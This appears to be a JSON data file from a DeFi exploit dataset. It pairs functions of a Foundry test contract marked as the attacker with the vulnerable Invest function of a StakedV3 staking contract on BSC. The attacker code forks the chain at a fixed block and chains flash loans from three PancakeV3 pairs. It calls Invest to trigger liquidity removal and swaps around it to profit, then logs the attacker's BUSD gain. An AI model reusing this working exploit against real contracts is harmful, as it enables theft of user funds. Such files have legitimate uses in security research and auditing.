[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {\n        if (msg.sender == address(Pair1)) {\n            Pair2.flash(address(this), 0, BUSD.balanceOf(address(Pair2)), abi.encode(BUSD.balanceOf(address(Pair2))));\n            uint256 repayAmount = abi.decode(data, (uint256));\n            BUSD.transfer(address(Pair1), repayAmount + amount1);\n        } else if (msg.sender == address(Pair2)) {\n            Pair3.flash(address(this), 0, BUSD.balanceOf(address(Pair3)), abi.encode(BUSD.balanceOf(address(Pair3))));\n            uint256 repayAmount = abi.decode(data, (uint256));\n            BUSD.transfer(address(Pair2), repayAmount + amount1);\n        } else if (msg.sender == address(Pair3)) {\n            BUSDToUSDT();\n            StakedV3.Invest(2, 1 ether, 2, 1, 7, block.timestamp + 1000); // remove liquidity and swap BUSD to USDT\n            USDTToBUSD();\n            uint256 repayAmount = abi.decode(data, (uint256));\n            BUSD.transfer(address(Pair3), repayAmount + amount1);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 30_043_573);\n        vm.label(address(BUSD), \"BUSD\");\n        vm.label(address(USDT), \"USDT\");\n        vm.label(address(Router), \"Router\");\n        vm.label(address(Pair1), \"Pair1\");\n        vm.label(address(Pair2), \"Pair2\");\n        vm.label(address(StakedV3), \"StakedV3\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        USDT.approve(address(Router), type(uint256).max);\n        BUSD.approve(address(Router), type(uint256).max);\n        BUSD.approve(address(StakedV3), type(uint256).max);\n        BUSD.approve(address(StakedV3), type(uint256).max);\n        Pair1.flash(address(this), 0, BUSD.balanceOf(address(Pair1)), abi.encode(BUSD.balanceOf(address(Pair1))));\n\n        emit log_named_decimal_uint(\n            \"Attacker BUSD balance after exploit\", BUSD.balanceOf(address(this)), BUSD.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IStakedV3",
    "source_type": "victim_contract",
    "function_name": "Invest",
    "original_code": "\tfunction Invest(\n\t\tuint id,\n\t\tuint amount,\n\t\tuint quoteAmount,\n\t\tuint investType,\n\t\tuint cycle,\n\t\tuint deadline\n\t) public payable nonReentrant {\n\t\trequire(pools[id].inStatus,\"Staked::invest project closed\");\n\t\trequire(deadline > block.timestamp,\"Staked::transaction lapsed\");\n\t\t// Pledged Tokens\n\t\tif(pools[id].token0 == weth) {\n\t\t\trequire(msg.value == amount,\"Staked::input eth is not accurate\");\n\t\t}else {\n\t\t\tTransferHelper.safeTransferFrom(pools[id].token0,msg.sender,address(this),amount);\n\t\t}\n\t\tuint balance = balanceOf(pools[id].token0);\n\t\tuint amount0 = lpRate(id);\n\n\t\tif(isFarm[id]) {\n\t\t\t// Liquidity check\n\t\t\t(bool pass,PoolToken memory tokens) = Challenge(id);\n\t\t\tif(!pass) {\n\t\t\t\t// Harvest income\n\t\t\t\t_harvest(id);\n\t\t\t\t// Remove liquidity\n\t\t\t\t_remove(id,tokens,deadline);\n\t\t\t\t// Exchange into pledged currency\n\t\t\t\t_reSwap(id,tokens);\n\t\t\t\t// Withdrawal of NFT\n\t\t\t\t_withdraw(id);\n\t\t\t\t// Update the latest currency price ratio\n\t\t\t\twightReset(id);\n\t\t\t}\n\t\t\t// Token exchange\n\t\t\t// Number of tokens participating in redemption\n\t\t\tbalance = balanceOf(pools[id].token0);\n\t\t\tamount0 = lpRate(id);\n\t\t\t// QuoteAmount Recalculate Valuation\n\t\t\tif(!pass) {\n\t\t\t\t(quoteAmount,) = _amountOut(id,pools[id].token0,pools[id].token1,amount0,false);\n\t\t\t}\n\t\t\t// Exchange token 1 token 0: Spend a fixed number of tokens\n\t\t\tSwap(id,pools[id].token0,pools[id].token1,amount0,quoteAmount,0);\n\n\t\t\t// Add liquidity\n\t\t\tif(pools[id].tokenId == 0) {\n\t\t\t\t// Mint\n\t\t\t\tMint(id,deadline);\n\t\t\t}else {\n\t\t\t\t// Append\n\t\t\t\tAppend(id,tokens,deadline);\n\t\t\t}\n\t\t}\n\t\tif(amount > 0) {\n\t\t\t// Accounting\n\t\t\tif(investType == 1) {\n\t\t\t\tIAssets(assets).plusAlone(msg.sender,id,pools[id].token0,amount);\n\t\t\t}\n\t\t\temit InvestToken(id,msg.sender,amount,investType,cycle,block.timestamp);\n\t\t}\n\t}\n\n\tstruct PoolToken {\n\t\taddress token0;\n\t\taddress token1;\n\t\tuint amount0;\n\t\tuint amount1;\n\t\tint24 tickLower;\n\t\tint24 tickUpper;\n\t\tuint160 sqrtPriceX96;\n\t\tuint160 sqrtRatioAX96;\n\t\tuint160 sqrtRatioBX96;\n\t\tuint128 liquidity;\n\t}\n\n\t// Converting tokens from ineffective liquidity into pledged tokens\n",
    "description": ""
  }
]